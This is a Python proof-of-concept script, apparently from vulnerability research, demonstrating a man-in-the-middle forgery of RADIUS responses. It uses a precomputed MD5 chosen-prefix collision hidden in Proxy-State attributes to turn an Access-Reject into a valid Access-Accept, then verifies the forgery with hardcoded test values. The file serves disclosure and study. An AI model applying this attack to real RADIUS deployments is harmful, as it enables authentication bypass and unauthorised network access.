#!/usr/bin/env python3

import argparse
from hashlib import md5

parser = argparse.ArgumentParser()
parser.add_argument("-v", "--verbose", action="store_true")
args = parser.parse_args()

verbose = args.verbose

def shorten_string(s, l, r):
	"""Shorten string to s[:l]...s[r:]"""
	if verbose:
		return s
	else:
		if r < 0:
			r = len(s) + r
		return s[:l] + "..." + s[r:]

# Access-Request sent from RADIUS client to RADIUS server and intercepted by MITM adversary
id = b"\x1d"
req_authenticator = bytes.fromhex("72616461757468656e74696361746f72")
req_attributes = bytes.fromhex("010674657374200b6c6f63616c686f737402221937186f353b5a04ff7b54d3d6842a4d2a5d981ec99b3e478234bdc62726ad3a")
original_access_request = b"\x01" + id + b"\x00\x47" + req_authenticator + req_attributes

print(f"""\
Access-Request sent from RADIUS client to RADIUS server and intercepted by MITM adversary:
raw: {original_access_request.hex()}
\t- Code: {original_access_request[:1].hex().zfill(2)}
\t- ID: {id.hex().zfill(2)}
\t- Request Authenticator: {req_authenticator.hex().zfill(16)}\
""")

# MITM adversary predicts the Access-Reject (code 0x03, length 0x01c0)  and Access-Accept (code 0x02, length 0x01c0) prefixes...
access_reject_prefix = b"\x03" + id + b"\x01\xc0" + req_authenticator
access_accept_prefix = b"\x02" + id + b"\x01\xc0" + req_authenticator

print(f"""
MITM adversary predicts the Access-Reject and Access-Accept prefixes:
\t- Access-Reject prefix: {access_reject_prefix.hex()}
\t- Access-Accept prefix: {access_accept_prefix.hex()}\
""")

# ... and computes the chosen-prefix collision, producing the reject gibberish `reject_gibberish` and accept gibberish `accept_gibberish`
reject_gibberish = bytes.fromhex("21ec96489725a6fb17281ad35262cbc755d7cd86e55fd083019b4d550661ab888a0000001d3bf48f2974d47cbbd37b5fed5cec8cb1ede5a5d29d0f0e8db7a82ba7c6bcc314370e0b3254eab4b65ef3589566b433d3d4edbbb59a120093e6ad85c001674a0b3b476f48c533015085f12b314a178adab324d34c41ef45b771d6577d0cd91f9b9b365a607a449c0887c6b0f927539f5ea1210f1add8ff2392bd6dc8e064efd7304ba11153d5a75870a77cede7fa3ce06d034f5c865df409bcb8a091968f6a046ed5d5802c3a4cc9dff16e07ade21039e3df85a860a4d29f959fa07538e6782d8eed75c8236458621c0f5e29c6113ef5a637e70122d2ccaf753906d6cee4c5ebfff1cac04ea385b188a05dc0e56c51d7fe7b182641142e0fbddfc59e0f46bfa7818192d64f9e529baf6db6b73a9f200aac1b04916ee458fcaa5854506d81bc728b0812e57b155fe462c7607a644a0ac4de10c45ba837821f7fc87213062f3d6538ce49de100c358f9ae9e0bb1001e30dbe3020b6faf2a76c0308ae1e32c9823386625da78e534f4bedc95cb6fc02ed3fcdf4ad0e25dc38ae4a28ad1d7cea356bc364b73cefe989e")

accept_gibberish = bytes.fromhex("21ec3d6284110175d34deb8093de31c1d93045fbbe1e71f00a6375a830aa9817ee000000d5e012ab6b4d17c6bbd37b5fed5cec8cb1ede5a5d29d0f0e8db7a82ba7c6bcc314370e0b3254eab4b65ef3589566b433d3d4edbbb59a1a0093e6ad85c001674a0b3b476f48c533015085f12b314a178adab324d34c41ef45b771d6577d0cd91f9b9b365a607a449c0887c6b0f927539f5ea1210f1add8ffa392bd6dc8e064efd7304ba11153d5a75870a77cede7fa3ce06d034f5c865df409bcb8a091968f6a046ed5d5802c3a4cc9dff16e07ade21039e3df85a860a4f29f959fa07538e6782d8eed75c8236458621c0f5e29c6113ef5a637e70122d2ccaf753906d6cee4c5ebfff1cac04ea385b188a05dc0e56c51d7fe7b182643142e0fbddfc59e0f46bfa7818192d64f9e529baf6db6b73a9f200aac1b04916ee458fcaa5854506d81bc728b0812e57b155fe462c7607a644a0ac4de10c45ba83f821f7fc87213062f3d6538ce49de100c358f9ae9e0bb1001e30dbe3020b6faf2a76c0308ae1e32c9823386625da78e534f4bedc95cb6fc02ed3fcdf4ad0e25dc34ae4a28ad1d7cea356bc364b73cefe989e")

print(f"""
MITM adversary computes the chosen-prefix collision, producing the reject gibberish and accept gibberish:
\t- Access-Reject gibberish: {shorten_string(reject_gibberish.hex(), 12, -12)} ({len(reject_gibberish)} bytes)
\t- Access-Accept gibberish: {shorten_string(accept_gibberish.hex(), 12, -12)} ({len(accept_gibberish)} bytes)\
""")

# MITM adversary modifies the access request to append reject gibberish `reject_gibberish` as Proxy-State attributes
mod_access_request = b"\x01" + id + b"\x01\xf3" + req_authenticator + req_attributes + reject_gibberish

print(f"""
MITM adversary appends Access-Reject gibberish as Proxy-State attributes to Access-Request and sends this to the RADIUS server:
{shorten_string(mod_access_request.hex(), 154, -12)}\
""")

# MITM adversary sends `mod_access_request` to RADIUS server and receives Access-Reject `access_reject_pkt` (Code 0x03) from RADIUS server
# and parses Response Authenticator from Access Reject
response_authenticator = bytes.fromhex("6034d0ff16e4e41c2df78639a4901530")
access_reject_pkt = b"\x03" + id + b"\x01\xc0" + response_authenticator + reject_gibberish

print(f"""
MITM adversary intercepts the Access-Reject response by the RADIUS server, and learns the Response Authenticator:
{shorten_string(access_reject_pkt.hex(), 52, -12)}
\t- Response Authenticator: {response_authenticator.hex()}\
""")

# MITM adversary uses the computed prefix collision to turn the Access-Reject into the following Access-Accept `access_accept_pkt`
access_accept_pkt = b"\x02" + id + b"\x01\xc0" + response_authenticator + accept_gibberish

print(f"""
The MITM adversary uses the computed prefix collision to turn the Access-Reject into the following Access-Accept, copying the Response Authenticator over from the Access-Reject:
{shorten_string(access_accept_pkt.hex(), 52, -12)}\
""")

# This Access-Accept is sent to the RADIUS client.

###############

# The RADIUS client does the following verification, using their knowledge of the shared secret

sharedsecret = b'testing123'

# Explicitly computing the Response Authenticator of the received Access-Accept:
accept_response_authenticator_input = access_accept_pkt[:4] + req_authenticator + access_accept_pkt[20:] + sharedsecret
accept_response_authenticator = md5(accept_response_authenticator_input).hexdigest()
assert response_authenticator.hex() == accept_response_authenticator

# This is the same response authenticator as the one for the Access-Reject packet
reject_response_authenticator_input = access_reject_pkt[:4] + req_authenticator + access_reject_pkt[20:] + sharedsecret
reject_response_authenticator = md5(reject_response_authenticator_input).hexdigest()
assert response_authenticator.hex() == reject_response_authenticator

print("\nBy explicitly computing the Response Authenticator of the Access-Accept and Access-Reject packets, as they would be computed on the RADIUS client, we confirm that they both produce the same Response Authenticator due to the MD5 collision:")
print(f"\t- Response Authenticator of Access-Accept: {accept_response_authenticator}", end="")
if verbose:
	print(f" = md5({accept_response_authenticator_input.hex()})", end="")

print(f"\n\t- Response Authenticator of Access-Reject: {reject_response_authenticator}", end="")
if verbose:
	print(f" = md5({reject_response_authenticator_input.hex()})", end="")
